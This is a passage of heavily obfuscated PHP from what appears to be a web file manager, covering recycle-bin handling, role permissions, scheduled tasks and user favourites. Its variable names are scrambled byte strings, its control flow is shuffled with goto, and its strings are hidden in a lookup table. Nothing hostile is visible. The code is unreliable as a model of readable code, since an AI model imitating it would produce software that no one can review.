self::$cacheChildList[$EÇÁÚ›ò…Š]; } goto bİ‰ŒÊÑìò; dÑŠÅ÷ÈŠê: } public function fileNameAuto($E’¥«¸ßˆ·, $DÊŒÕˆÜ÷¢, $aÆŞÏ‹ìã° = REPEAT_RENAME, $FŸ²¦ù«‚ = false) { $E±˜ÆÖÜ¶ =& $_SERVER[Ö¹ñÒÁ²÷]; $A¼ÂÁÓœŒï = $this->childList($E’¥«¸ßˆ·); $b¾„Õ‰Øš» = array_to_keyvalue($A¼ÂÁÓœŒï, $E±˜ÆÖÜ¶[33], $E±˜ÆÖÜ¶[28]); return $this->fileNameAutoGet($b¾„Õ‰Øš», $DÊŒÕˆÜ÷¢, $aÆŞÏ‹ìã°, $FŸ²¦ù«‚); } public function fileNameAutoGet($FóİÛô×¬, $CÂ˜Á‹½, $F°±ëˆ¥¢Á, $D‘·ƒÅ…“ô) { $bÚ³Œßõ„Ó =& $_SERVER[Ö¹ñÒÁ²÷]; if ($F°±ëˆ¥¢Á == REPEAT_REPLACE || !$FóİÛô×¬ || !in_array_not_case($CÂ˜Á‹½, $FóİÛô×¬) || $D‘·ƒÅ…“ô && $F°±ëˆ¥¢Á != REPEAT_RENAME_FOLDER) { return $CÂ˜Á‹½; } if ($F°±ëˆ¥¢Á == REPEAT_SKIP) { return !1; } $cºÓ†µÁ½… = $bÚ³Œßõ„Ó[91] . get_path_ext($CÂ˜Á‹½); $cºÓ†µÁ½… = $cºÓ†µÁ½… == $bÚ³Œßõ„Ó[91] || $D‘·ƒÅ…“ô ? $bÚ³Œßõ„Ó[33] : $cºÓ†µÁ½…; for ($fêöÃÕ¾ç = 1; $fêöÃÕ¾ç <= count($FóİÛô×¬) + 1; $fêöÃÕ¾ç++) { $bì”Ë‘‹¹ = substr($CÂ˜Á‹½, 0, strlen($CÂ˜Á‹½) - strlen($cºÓ†µÁ½…)); $eÑˆĞ˜«³Ù = $bì”Ë‘‹¹ . "\50{$fêöÃÕ¾ç}\x29{$cºÓ†µÁ½…}"; if (!in_array_not_case($eÑˆĞ˜«³Ù, $FóİÛô×¬)) { return $eÑˆĞ˜«³Ù; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\157\165\x72\x63\x65\137\162\145\143\171\x63\154\145"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\145\124\x69\x6d\145", "\x74\x69\x6d\145", "\x69\x6e\x73\145\x72\x74", "\146\x75\156\143\164\x69\x6f\156")); public function listData($fÇ‚‘Ü‘Æà = false) { $D‹œ÷ïÉØ› =& $_SERVER[Ö¹ñÒÁ²÷]; $fÇ‚‘Ü‘Æà = $fÇ‚‘Ü‘Æà ? $fÇ‚‘Ü‘Æà : USER_ID; $e‡•˜¨“À™ = $this->where(array($D‹œ÷ïÉØ›[1406] => $fÇ‚‘Ü‘Æà))->select(); return array_to_keyvalue($e‡•˜¨“À™, $D‹œ÷ïÉØ›[33], $D‹œ÷ïÉØ›[365]); } public function moveToRecycle($f‘†¨…‹õ) { goto B¦Î—ÊÌ¸; B¦Î—ÊÌ¸: $CÊ÷¾æ±–ª =& $_SERVER[Ö¹ñÒÁ²÷]; $díí¤³øÏ‰ = Model($CÊ÷¾æ±–ª[1104]); $E˜İóº²¡¨ = $díí¤³øÏ‰->sourceInfo($f‘†¨…‹õ); goto b¿öºŠºï; b¿öºŠºï: if (!$E˜İóº²¡¨ || $E˜İóº²¡¨[$CÊ÷¾æ±–ª[393]] == $CÊ÷¾æ±–ª[83]) { return; } $dõíÔ–ßë = array($CÊ÷¾æ±–ª[379] => $f‘†¨…‹õ, $CÊ÷¾æ±–ª[1406] => USER_ID, $CÊ÷¾æ±–ª[517] => $E˜İóº²¡¨[$CÊ÷¾æ±–ª[367]], $CÊ÷¾æ±–ª[518] => $E˜İóº²¡¨[$CÊ÷¾æ±–ª[452]], $CÊ÷¾æ±–ª[521] => $E˜İóº²¡¨[$CÊ÷¾æ±–ª[455]]); $this->add($dõíÔ–ßë); goto c®ïÓ¥´ğ¾; c®ïÓ¥´ğ¾: $this->recycleMove($f‘†¨…‹õ, 1); if ($E˜İóº²¡¨[$CÊ÷¾æ±–ª[366]] == $CÊ÷¾æ±–ª[83]) { $dË•Ó¢®©„ = array($CÊ÷¾æ±–ª[521] => array($CÊ÷¾æ±–ª[479], $E˜İóº²¡¨[$CÊ÷¾æ±–ª[455]] . $f‘†¨…‹õ . $CÊ÷¾æ±–ª[480])); $díí¤³øÏ‰->where($dË•Ó¢®©„)->setField($CÊ÷¾æ±–ª[393], 1); } goto d‰©Ñ¤Ğ…Î; d‰©Ñ¤Ğ…Î: } public function clear() { $this->remove(!1); } public function remove($dï¿Êë¿˜é = false) { goto dõê½İÂëˆ; D¼‡ö”—Œ: foreach ($cÔ¥£Şª›¤ as $aòØ´ïŸ) { $E¥ôé¡…ßª->targetSpaceUpdate($aòØ´ïŸ[$eÅ«×óÒ“ˆ[367]], $aòØ´ïŸ[$eÅ«×óÒ“ˆ[452]]); } goto BÄàºùÂ•ï; dõê½İÂëˆ: $eÅ«×óÒ“ˆ =& $_SERVER[Ö¹ñÒÁ²÷]; $E¥ôé¡…ßª = Model($eÅ«×óÒ“ˆ[1104]); $Bô›çŠƒ³Î = $this->listData(); goto DöËº™õÂÉ; DöËº™õÂÉ: $dï¿Êë¿˜é = $dï¿Êë¿˜é === !1 ? !1 : $dï¿Êë¿˜é; $cÔ¥£Şª›¤ = array(); foreach ($Bô›çŠƒ³Î as $eÂ¤ù‚Ì½¨) { if ($dï¿Êë¿˜é != !1 && !in_array($eÂ¤ù‚Ì½¨, $dï¿Êë¿˜é)) { continue; } $E¥ôé¡…ßª->remove($eÂ¤ù‚Ì½¨, !1); $AÊÎ«â‰‘È = $this->where(array($eÅ«×óÒ“ˆ[365] => $eÂ¤ù‚Ì½¨))->find(); $D–ç½Áß± = $AÊÎ«â‰‘È[$eÅ«×óÒ“ˆ[367]] . $eÅ«×óÒ“ˆ[70] . $AÊÎ«â‰‘È[$eÅ«×óÒ“ˆ[452]]; $cÔ¥£Şª›¤[$D–ç½Áß±] = array($eÅ«×óÒ“ˆ[517] => $AÊÎ«â‰‘È[$eÅ«×óÒ“ˆ[367]], $eÅ«×óÒ“ˆ[452] => $AÊÎ«â‰‘È[$eÅ«×óÒ“ˆ[452]]); $this->where(array($eÅ«×óÒ“ˆ[365] => $eÂ¤ù‚Ì½¨))->delete(); } goto D¼‡ö”—Œ; BÄàºùÂ•ï: } public function restore($Cß°ñŸà²¹ = false) { goto DÒÀŞä‡ó; DÒÀŞä‡ó: $få­¯½Ğà§ =& $_SERVER[Ö¹ñÒÁ²÷]; $cÈ‚¡éÃ–é = Model($få­¯½Ğà§[1104]); $câÄ·Á  = $this->listData(); goto D¾ëÛ¨Ù”õ; D¾ëÛ¨Ù”õ: $Cß°ñŸà²¹ = $Cß°ñŸà²¹ == !1 ? !1 : $Cß°ñŸà²¹; if (!$câÄ·Á ) { return !0; } $B˜Èìéµ¶À = array(); goto fì¢˜¹Ûèº; fì¢˜¹Ûèº: foreach ($câÄ·Á  as $A’ÃÅ¢È–) { goto d·Ò™ØÒƒ·; D“›…¢§ˆå: $B˜Èìéµ¶À[] = $bÉØ¸éÈá[$få­¯½Ğà§[457]]; if ($bÉØ¸éÈá[$få­¯½Ğà§[366]] == $få­¯½Ğà§[83]) { $B˜Èìéµ¶À[] = $A’ÃÅ¢È–; } $cÈ‚¡éÃ–é->lockMoveEnd($A’ÃÅ¢È–); goto EÌ¨—Ø×¶¾; e»ë¼êï‘: if ($eØ†©›‡­¬[$få­¯½Ğà§[393]] == $få­¯½Ğà§[83]) { continue; } $cÈ‚¡éÃ–é->lockMoveStart($A’ÃÅ¢È–); $this->recycleMove($A’ÃÅ¢È–, 0); goto BîÇ¨ÀˆÈ; BîÇ¨ÀˆÈ: if ($bÉØ¸éÈá[$få­¯½Ğà§[366]] == $få­¯½Ğà§[83]) { $aØ”¼Òã°¹ = array($få­¯½Ğà§[521] => array($få­¯½Ğà§[479], $bÉØ¸éÈá[$få­¯½Ğà§[455]] . $A’ÃÅ¢È– . $få­¯½Ğà§[480])); $cÈ‚¡éÃ–é->where($aØ”¼Òã°¹)->setField($få­¯½Ğà§[393], 0); $this->restoreFolderChildren($A’ÃÅ¢È–, $câÄ·Á ); } $this->where(array($få­¯½Ğà§[365] => $A’ÃÅ¢È–))->delete(); $cÈ‚¡éÃ–é->folderSizeReset($bÉØ¸éÈá[$få­¯½Ğà§[457]]); goto D“›…¢§ˆå; d·Ò™ØÒƒ·: if ($Cß°ñŸà²¹ != !1 && !in_array($A’ÃÅ¢È–, $Cß°ñŸà²¹)) { continue; } $bÉØ¸éÈá = $cÈ‚¡éÃ–é->sourceInfo($A’ÃÅ¢È–); $eØ†©›‡­¬ = $cÈ‚¡éÃ–é->sourceInfo($bÉØ¸éÈá[$få­¯½Ğà§[457]]); goto e»ë¼êï‘; EÌ¨—Ø×¶¾: } $cÈ‚¡éÃ–é->updateModifyTime($B˜Èìéµ¶À); goto FÔ¶àˆ¡Ê; FÔ¶àˆ¡Ê: } private function restoreFolderChildren($eÄ‚Á¬¾øæ, $CŸòÌµ¡) { goto Bí‚„ÕˆÓß; Bí‚„ÕˆÓß: $c’†³¶Ôñ¤ =& $_SERVER[Ö¹ñÒÁ²÷]; $F‡îËÓ„òã = Model($c’†³¶Ôñ¤[1104]); $BÇ¶×¤°ê = array($c’†³¶Ôñ¤[365] => array($c’†³¶Ôñ¤[7], array())); goto eİ—¶ÊÏÔ¯; cˆŠ öë¥Å: $BÇ¶×¤°ê[$c’†³¶Ôñ¤[365]][1] = array_unique($BÇ¶×¤°ê[$c’†³¶Ôñ¤[365]][1]); $BÇ¶×¤°ê[$c’†³¶Ôñ¤[910]] = $c’†³¶Ôñ¤[2160]; $F‡îËÓ„òã->where($BÇ¶×¤°ê)->setField($c’†³¶Ôñ¤[393], 1); goto eˆ¬‡¤¦ÌÇ; eİ—¶ÊÏÔ¯: foreach ($CŸòÌµ¡ as $B¥ì¼†ƒÉ¸) { if ($B¥ì¼†ƒÉ¸ == $eÄ‚Á¬¾øæ) { continue; } if (!$F‡îËÓ„òã->isParentOf($eÄ‚Á¬¾øæ, $B¥ì¼†ƒÉ¸)) { continue; } $b©ÇœÍÖ£ = $F‡îËÓ„òã->sourceInfo($B¥ì¼†ƒÉ¸); if ($b©ÇœÍÖ£[$c’†³¶Ôñ¤[366]] == $c’†³¶Ôñ¤[83]) { $BÇ¶×¤°ê[] = array($c’†³¶Ôñ¤[521] => array($c’†³¶Ôñ¤[479], $b©ÇœÍÖ£[$c’†³¶Ôñ¤[455]] . $B¥ì¼†ƒÉ¸ . $c’†³¶Ôñ¤[480])); } else { $BÇ¶×¤°ê[$c’†³¶Ôñ¤[365]][1][] = $B¥ì¼†ƒÉ¸; } } if (!$BÇ¶×¤°ê[$c’†³¶Ôñ¤[365]][1]) { unset($BÇ¶×¤°ê[$c’†³¶Ôñ¤[365]]); } if (!$BÇ¶×¤°ê) { return; } goto cˆŠ öë¥Å; eˆ¬‡¤¦ÌÇ: } private function recycleMove($fã†Ò‰Åù, $cÎ®Œïà†Œ = 1) { $aŒÌºÅ¨ˆ¥ =& $_SERVER[Ö¹ñÒÁ²÷]; $c„‘ùšã¤Ï = Model($aŒÌºÅ¨ˆ¥[1104]); $d½êÀŒ¹™ = Model($aŒÌºÅ¨ˆ¥[2336]); $EšÁ†ÁÛä‡ = array($aŒÌºÅ¨ˆ¥[365] => $fã†Ò‰Åù); if ($cÎ®Œïà†Œ) { $c„‘ùšã¤Ï->where($EšÁ†ÁÛä‡)->setField($aŒÌºÅ¨ˆ¥[393], 1); $d½êÀŒ¹™->eventRecycle($fã†Ò‰Åù, $aŒÌºÅ¨ˆ¥[2337]); } else { $CÉ…©•¥‹ˆ = $c„‘ùšã¤Ï->where($EšÁ†ÁÛä‡)->find(); $BŠäàïøõ = $CÉ…©•¥‹ˆ[$aŒÌºÅ¨ˆ¥[366]] == $aŒÌºÅ¨ˆ¥[83]; $Fæ¯ÖÊÊ¨ = $c„‘ùšã¤Ï->fileNameAuto($CÉ…©•¥‹ˆ[$aŒÌºÅ¨ˆ¥[457]], $CÉ…©•¥‹ˆ[$aŒÌºÅ¨ˆ¥[28]], REPEAT_RENAME_FOLDER, $BŠäàïøõ); if ($Fæ¯ÖÊÊ¨ != $CÉ…©•¥‹ˆ[$aŒÌºÅ¨ˆ¥[28]]) { $c„‘ùšã¤Ï->rename($fã†Ò‰Åù, $Fæ¯ÖÊÊ¨); } $c„‘ùšã¤Ï->where($EšÁ†ÁÛä‡)->setField($aŒÌºÅ¨ˆ¥[393], 0); $d½êÀŒ¹™->eventRecycle($fã†Ò‰Åù, $aŒÌºÅ¨ˆ¥[2338]); } } } goto f†‚ñêº›õ; eÙ·ŞÏ÷Áƒ: class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\x79\x73\164\x65\x6d\x2e\x72\157\154\x65\114\151\x73\164"; public $field = array("\156\141\155\x65", "\x61\x75\x74\x68", "\x6c\x61\x62\x65\154", "\144\x69\163\x70\154\141\x79", "\163\x79\x73\164\x65\x6d", "\x64\x65\x73\143", "\151\x67\x6e\157\162\x65\105\170\x74", "\x69\147\x6e\157\162\145\106\151\154\145\x53\151\x7a\x65", "\141\x64\x6d\x69\156\x69\163\x74\162\141\164\x6f\x72", "\x73\157\162\x74"); public function listData($a—²¥ò²åÑ = false, $dª›Æöİ” = "\x73\157\162\164", $bÕĞÓÏåˆÕ = false) { return parent::listData($a—²¥ò²åÑ, $dª›Æöİ”, $bÕĞÓÏåˆÕ); } public function update($d¯œĞƒºñ™, $D™²‹Çç‹) { goto B¹ÌÅÉÃ·Í; D’Ó•ÊÛñ´: if (!$fµÇ³Íâ˜Ñ || $F¦›®Äç¿¯ && $F¦›®Äç¿¯[$bÊ¿Â®‰°Î[363]] != $fµÇ³Íâ˜Ñ[$bÊ¿Â®‰°Î[363]]) { return !1; } if ($F¦›®Äç¿¯[$bÊ¿Â®‰°Î[2456]] == 1) { $D™²‹Çç‹ = array($bÊ¿Â®‰°Î[28] => $D™²‹Çç‹[$bÊ¿Â®‰°Î[28]], $bÊ¿Â®‰°Î[2097] => $D™²‹Çç‹[$bÊ¿Â®‰°Î[2097]]); } $this->filterAuth($D™²‹Çç‹[$bÊ¿Â®‰°Î[372]]); goto cÂë©èƒâ¯; B¹ÌÅÉÃ·Í: $bÊ¿Â®‰°Î =& $_SERVER[Ö¹ñÒÁ²÷]; $fµÇ³Íâ˜Ñ = parent::listData($d¯œĞƒºñ™); $F¦›®Äç¿¯ = $this->findByName($D™²‹Çç‹[$bÊ¿Â®‰°Î[28]]); goto D’Ó•ÊÛñ´; cÂë©èƒâ¯: return parent::update($d¯œĞƒºñ™, $D™²‹Çç‹); goto fÛÆº£Å—‘; fÛÆº£Å—‘: } public function remove($FÎÔóáğÜÒ) { $Bï˜‘êë²º = parent::listData($FÎÔóáğÜÒ); if (!$Bï˜‘êë²º || $Bï˜‘êë²º[$_SERVER[Ö¹ñÒÁ²÷][1074]]) { return !1; } return parent::remove($FÎÔóáğÜÒ); } public function add($FÍ²“ÍÁˆ) { goto fŸ®†ğ¥‡É; fŸ®†ğ¥‡É: $fò‡®†ò§– =& $_SERVER[Ö¹ñÒÁ²÷]; $DŠ¦Ë†±Û = $FÍ²“ÍÁˆ[$fò‡®†ò§–[28]]; if ($this->findByName($DŠ¦Ë†±Û)) { return !1; } goto D«ªù”Šä; D«ªù”Šä: $EËÆ¤’’…¶ = array($fò‡®†ò§–[382] => $DŠ¦Ë†±Û, $fò‡®†ò§–[2085] => $fò‡®†ò§–[33], $fò‡®†ò§–[2081] => $fò‡®†ò§–[2098], $fò‡®†ò§–[2457] => 1, $fò‡®†ò§–[2084] => 0, $fò‡®†ò§–[2458] => 0, $fò‡®†ò§–[2083] => $this->getSort()); $FÍ²“ÍÁˆ = array_merge($EËÆ¤’’…¶, $FÍ²“ÍÁˆ); $this->filterAuth($FÍ²“ÍÁˆ[$fò‡®†ò§–[372]]); goto dí¦ß‡®»; dí¦ß‡®»: return parent::insert($FÍ²“ÍÁˆ); goto c¼‚·Ëäö‘; c¼‚·Ëäö‘: } private function getSort() { $dâÌˆ¿·ë =& $_SERVER[Ö¹ñÒÁ²÷]; $C‘Ì¥¾¢¤Æ = parent::listData(); $eèªè³ìÜà = array_to_keyvalue($C‘Ì¥¾¢¤Æ, $dâÌˆ¿·ë[33], $dâÌˆ¿·ë[2100]); return empty($eèªè³ìÜà) ? 0 : max($eèªè³ìÜà) + 1; } private function filterAuth(&$Eè¬ÍÜ¾Í) { $aé¼ù›ÛáÇ =& $_SERVER[Ö¹ñÒÁ²÷]; $DÆñàŞ¡Ÿ = array(); $Aˆ…õÌÉÕ• = array_filter(explode($aé¼ù›ÛáÇ[47], $Eè¬ÍÜ¾Í)); foreach ($Aˆ…õÌÉÕ• as $Eè¬ÍÜ¾Í) { $få±åóó×¢ = explode($aé¼ù›ÛáÇ[91], $Eè¬ÍÜ¾Í); if ($få±åóó×¢[0] == $aé¼ù›ÛáÇ[1759] && $få±åóó×¢[1] != $aé¼ù›ÛáÇ[1030]) { $c ¦¸´Å£¦ = $få±åóó×¢[0] . $aé¼ù›ÛáÇ[91] . $få±åóó×¢[1] . $aé¼ù›ÛáÇ[2459]; if (!in_array($c ¦¸´Å£¦, $Aˆ…õÌÉÕ•)) { $DÆñàŞ¡Ÿ[] = $c ¦¸´Å£¦; } } $DÆñàŞ¡Ÿ[] = $Eè¬ÍÜ¾Í; } $Eè¬ÍÜ¾Í = implode($aé¼ù›ÛáÇ[47], $DÆñàŞ¡Ÿ); } public function sort($fããŞ‹¨Ğå, $AÑë…Ñ¿‰) { return parent::update($fããŞ‹¨Ğå, $AÑë…Ñ¿‰); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x74\141\163\153\x4c\151\163\164"; public $field = array("\x6e\141\x6d\145", "\164\171\x70\x65", "\x65\x76\145\156\x74", "\x74\x69\155\x65", "\144\145\x73\143", "\163\171\x73\x74\x65\x6d", "\x65\156\141\x62\154\145", "\x6c\x61\x73\164\x52\x75\x6e", "\x73\157\x72\164"); public function listData($D×ÚëØ·–¾ = false, $aé§é®¥Ìä = "\x73\157\x72\x74", $cİ¡ÏÜá“ = false) { return parent::listData($D×ÚëØ·–¾, $aé§é®¥Ìä, $cİ¡ÏÜá“); } public function add($eãçÏ‚¹íİ) { $bÒ³§•ÛóÀ =& $_SERVER[Ö¹ñÒÁ²÷]; $FëÕˆ¢šË¶ = $this->findByName($eãçÏ‚¹íİ[$bÒ³§•ÛóÀ[28]]); if ($FëÕˆ¢šË¶) { return !1; } $eãçÏ‚¹íİ[$bÒ³§•ÛóÀ[1380]] = 0; $eãçÏ‚¹íİ[$bÒ³§•ÛóÀ[2100]] = $this->getSort(); return parent::insert($eãçÏ‚¹íİ); } private function getSort() { $D¬­³ ·ğÏ =& $_SERVER[Ö¹ñÒÁ²÷]; $E‹Ğ³·Ïî‚ = parent::listData(); $dÓğ°É¤ñÒ = array_to_keyvalue($E‹Ğ³·Ïî‚, $D¬­³ ·ğÏ[33], $D¬­³ ·ğÏ[2100]); return empty($dÓğ°É¤ñÒ) ? 0 : max($dÓğ°É¤ñÒ) + 1; } public function update($C×Œ®ÑŞÌ‹, $D¨ƒÜÍ¢´Ì) { $a§‚ôÑ¤‡ =& $_SERVER[Ö¹ñÒÁ²÷]; $aƒÕµ–³š¡ = $this->listData($C×Œ®ÑŞÌ‹); $Fç­ÃÀóºœ = $this->findByName($D¨ƒÜÍ¢´Ì[$a§‚ôÑ¤‡[28]]); if (!$aƒÕµ–³š¡ || $Fç­ÃÀóºœ && $Fç­ÃÀóºœ[$a§‚ôÑ¤‡[363]] != $aƒÕµ–³š¡[$a§‚ôÑ¤‡[363]]) { return !1; } return parent::update($C×Œ®ÑŞÌ‹, $D¨ƒÜÍ¢´Ì); } public function remove($C™È¥¼Ğ, $Cë–«“è£ = false) { $b”—Ğœ¿åö =& $_SERVER[Ö¹ñÒÁ²÷]; $a²†Øö—ƒ = $this->listData($C™È¥¼Ğ); if (!$a²†Øö—ƒ) { return; } if (!$Cë–«“è£ && $a²†Øö—ƒ[$b”—Ğœ¿åö[1074]] == $b”—Ğœ¿åö[83]) { return !1; } return parent::remove($C™È¥¼Ğ); } public function enable($fÂ“à‡ç¸á, $FÌÊŞ™•ó•) { return $this->update($fÂ“à‡ç¸á, array($_SERVER[Ö¹ñÒÁ²÷][2450] => $FÌÊŞ™•ó•)); } public function run($BÄŒÆÀİå) { return $this->update($BÄŒÆÀİå, array($_SERVER[Ö¹ñÒÁ²÷][2460] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($DåÄÑ³à•±) { $cé ›öÃƒ =& $_SERVER[Ö¹ñÒÁ²÷]; return array($cé ›öÃƒ[2461] => array(USER_ID, $cé ›öÃƒ[2462])); } protected function listData() { $c¤™§ïÔôã =& $_SERVER[Ö¹ñÒÁ²÷]; $B“ĞñÇ’Ñ = array($c¤™§ïÔôã[1406] => USER_ID, $c¤™§ïÔôã[432] => 0); $A»˜ñµ  = $c¤™§ïÔôã[2463]; $DâÜ°®à®¾ = $this->field($A»˜ñµ )->where($B“ĞñÇ’Ñ)->order($c¤™§ïÔôã[2464])->select(); return $DâÜ°®à®¾ ? $DâÜ°®à®¾ : array(); } protected function resetCache() { } protected function listView() { goto cš¤éèìèë; cš¤éèìèë: $dÅ¯é‰Ñ±À =& $_SERVER[Ö¹ñÒÁ²÷]; $aÄ‹æ³¿Ë = $this->listData(); $Aå–˜“šÄ = array_filter_by_field($aÄ‹æ³¿Ë, $dÅ¯é‰Ñ±À[29], $dÅ¯é‰Ñ±À[378]); goto bë´ëîëï; bë´ëîëï: $DÆÜèŞ•ë³ = array_to_keyvalue($Aå–˜“šÄ, $dÅ¯é‰Ñ±À[33], $dÅ¯é‰Ñ±À[75]); if (!$DÆÜèŞ•ë³) { return $aÄ‹æ³¿Ë; } $eôº¹ç„Û† = 2000; goto CÇ¸á­³Ê; b£‘…íÌö: $CÀÚ Êéäº = array_to_keyvalue($CÀÚ Êéäº, $dÅ¯é‰Ñ±À[365]); foreach ($aÄ‹æ³¿Ë as $e¡¬·º¤È => $AŠ¾›¿«È) { $CÃÖ÷»•˜° = $CÀÚ Êéäº[$AŠ¾›¿«È[$dÅ¯é‰Ñ±À[75]]]; $CÃÖ÷»•˜° = $CÃÖ÷»•˜° ? $CÃÖ÷»•˜° : array(); $aÄ‹æ³¿Ë[$e¡¬·º¤È] = array_merge($CÃÖ÷»•˜°, $AŠ¾›¿«È); } return $aÄ‹æ³¿Ë; goto e¼ÇÍ’ç´Ä; CÇ¸á­³Ê: $d¥’èÒªçÙ = array($dÅ¯é‰Ñ±À[379] => array($dÅ¯é‰Ñ±À[380], $DÆÜèŞ•ë³)); $CÀÚ Êéäº = Model($dÅ¯é‰Ñ±À[749])->listSource($d¥’èÒªçÙ, $eôº¹ç„Û†); $CÀÚ Êéäº = array_merge($CÀÚ Êéäº[$dÅ¯é‰Ñ±À[73]], $CÀÚ Êéäº[$dÅ¯é‰Ñ±À[74]]); goto b£‘…íÌö; e¼ÇÍ’ç´Ä: } protected function addFav($a¾íéÛ—ÆÀ, $EÒèÆšÂË‡ = '', $AÇÊ°†È– = "\x73\x6f\x75\162\x63\145") { goto B…Œêå; AÁóÌ‡æÀ: return $this->add($B—…¬šÉÑÕ); goto fùÄê‡¹»œ; e…ÃÈˆºÄ: $E„£Û¶± = array($fº‘ŠÈ¡Íî[1406] => USER_ID, $fº‘ŠÈ¡Íî[432] => 0); $Dº°‚ï“í = $this->where($E„£Û¶±)->max($fº‘ŠÈ¡Íî[2100]); if (!$Dº°‚ï“í) { $Dº°‚ï“í = 0; } goto a¸’ ”¢¥Ò; a¸’ ”¢¥Ò: if (!$EÒèÆšÂË‡ && $AÇÊ°†È– == $fº‘ŠÈ¡Íî[378]) { $bµÛÃÕ = Model($fº‘ŠÈ¡Íî[1104])->where(array($fº‘ŠÈ¡Íî[379] => $a¾íéÛ—ÆÀ))->find(); if (!$bµÛÃÕ) { return !1; } $EÒèÆšÂË‡ = $bµÛÃÕ[$fº‘ŠÈ¡Íî[28]]; } $EÒèÆšÂË‡ = $this->getAutoName($EÒèÆšÂË‡); $B—…¬šÉÑÕ = array($fº‘ŠÈ¡Íî[1406] => USER_ID, $fº‘ŠÈ¡Íî[432] => 0, $fº‘ŠÈ¡Íî[382] => $EÒèÆšÂË‡, $fº‘ŠÈ¡Íî[383] => $a¾íéÛ—ÆÀ, $fº‘ŠÈ¡Íî[384] => $AÇÊ°†È–, $fº‘ŠÈ¡Íî[2083] => $Dº°‚ï“í + 1); goto AÁóÌ‡æÀ; B…Œêå: $fº‘ŠÈ¡Íî =& $_SERVER[Ö¹ñÒÁ²÷]; $E„£Û¶± = array($fº‘ŠÈ¡Íî[1406] => USER_ID, $fº‘ŠÈ¡Íî[432] => 0, $fº‘ŠÈ¡Íî[384] => $AÇÊ°†È–, $fº‘ŠÈ¡Íî[383] => $a¾íéÛ—ÆÀ); if ($this->where($E„£Û¶±)->find()) { return !1; } goto e…ÃÈˆºÄ; fùÄê‡¹»œ: } protected function remove($aÈÓ•°¹çâ) { $a®ÂƒëİÑ¸ =& $_SERVER[Ö¹ñÒÁ²÷]; $bˆˆùŠ¦ = array($a®ÂƒëİÑ¸[1406] => USER_ID, $a®ÂƒëİÑ¸[381] => $aÈÓ•°¹çâ); return $this->where($bˆˆùŠ¦)->delete(); } protected function removeByName($bÆ’¤Ê£Ó) { $D¬Âõó¿ŞÙ =& $_SERVER[Ö¹ñÒÁ²÷]; $e¬®Ö°š¸á = array($D¬Âõó¿ŞÙ[1406] => USER_ID, $D¬Âõó¿ŞÙ[382] => $bÆ’¤Ê£Ó, $D¬Âõó¿ŞÙ[432] => 0); return $this->where($e¬®Ö°š¸á)->delete(); } protected function rename($Fí¹‡õ‰Ô, $B˜öôãøÒ) { $c¼Á‰ÇÌõ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($Fí¹‡õ‰Ô == $B˜öôãøÒ) { return !1; } $D—¸“áÒß½ = $this->getAutoName($B˜öôãøÒ); if ($B˜öôãøÒ != $D—¸“áÒß½) { return !1; } $bºšÑªˆ‚ = array($c¼Á‰ÇÌõ[1406] => USER_ID, $c¼Á‰ÇÌõ[432] => 0, $c¼Á‰ÇÌõ[28] => $Fí¹‡õ‰Ô); return $this->where($bºšÑªˆ‚)->save(array($c¼Á‰ÇÌõ[28] => $B˜öôãøÒ)); } protected function resetSort($F¸‚ÛóíğŒ) { $eÛÆÔ‡Šƒø =& $_SERVER[Ö¹ñÒÁ²÷]; $F¸‚ÛóíğŒ = is_array($F¸‚ÛóíğŒ) ? $F¸‚ÛóíğŒ : array(); $aìÎ£å°£ = array($eÛÆÔ‡Šƒø[1406] => USER_ID); for ($DÙŒ¶Şôí = 0; $DÙŒ¶Şôí < count($F¸‚ÛóíğŒ); $DÙŒ¶Şôí++) { $aìÎ£å°£[$eÛÆÔ‡Šƒø[381]] = $F¸‚ÛóíğŒ[$DÙŒ¶Şôí]; $this->where($aìÎ£å°£)->save(array($eÛÆÔ‡Šƒø[2083] => $DÙŒ¶Şôí + 1)); } return !0; } protected function moveTop($fêî‡¤¶ˆÁ) { goto Fî÷Æ³“Ñ„; Cñå†Ùãœ·: if (!$a§Å¡ãõº‡) { return; } $c½ó‘ÒëÖ = $this->field($cñ¬¡Ë‘˜¿[363])->where($bÕŒÌĞæÜ†)->order($cñ¬¡Ë‘˜¿[2464])->select(); $c½ó‘ÒëÖ = array_to_keyvalue($c½ó‘ÒëÖ, $cñ¬¡Ë‘˜¿[33], $cñ¬¡Ë‘˜¿[363]); goto cÚ‰§ñ”ª; C¸¦…ÜåÁ§: return $this->resetSort($c½ó‘ÒëÖ); goto Cˆ‡ùƒÛ˜´; Fî÷Æ³“Ñ„: $cñ¬¡Ë‘˜¿ =& $_SERVER[Ö¹ñÒÁ²÷]; $bÕŒÌĞæÜ† = array($cñ¬¡Ë‘˜¿[1406] => USER_ID, $cñ¬¡Ë‘˜¿[432] => 0); $a§Å¡ãõº‡ = $this->where($bÕŒÌĞæÜ†)->where(array($cñ¬¡Ë‘˜¿[28] => $fêî‡¤¶ˆÁ))->find(); goto Cñå†Ùãœ·; cÚ‰§ñ”ª: $b¶èêÑî•« = $c½ó‘ÒëÖ; $c½ó‘ÒëÖ = array_remove_value($c½ó‘ÒëÖ, $a§Å¡ãõº‡[$cñ¬¡Ë‘˜¿[363]]); array_unshift($c½ó‘ÒëÖ, $a§Å¡ãõº‡[$cñ¬¡Ë‘˜¿[363]]); goto C¸¦…ÜåÁ§; Cˆ‡ùƒÛ˜´: } protected function moveBottom($b—Çİ¾ì³¼) { $eâ‡–‘Ğñ‰ =& $_SERVER[Ö¹ñÒÁ²÷]; $dåãœØÎÈä = array($eâ‡–‘Ğñ‰[1406] => USER_ID, $eâ‡–‘Ğñ‰[432] => 0); $d¾·…º¶óŒ = $this->where($dåãœØÎÈä)->max($eâ‡–‘Ğñ‰[2100]); $E§ÉÅÇ‡ƒ¨ = array($eâ‡–‘Ğñ‰[2100] => $d¾·…º¶óŒ + 1); return $this->where($dåãœØÎÈä)->where(array($eâ‡–‘Ğñ‰[28] => $b—Çİ¾ì³¼))->save($E§ÉÅÇ‡ƒ¨); } private function getAutoName($DËÌÍ­øÉƒ) { goto F·öÆ‘ÈŠ­; cõº—Æª¾: return $DËÌÍ­øÉƒ . "\x28{$eøö¤ê’è}\51"; goto 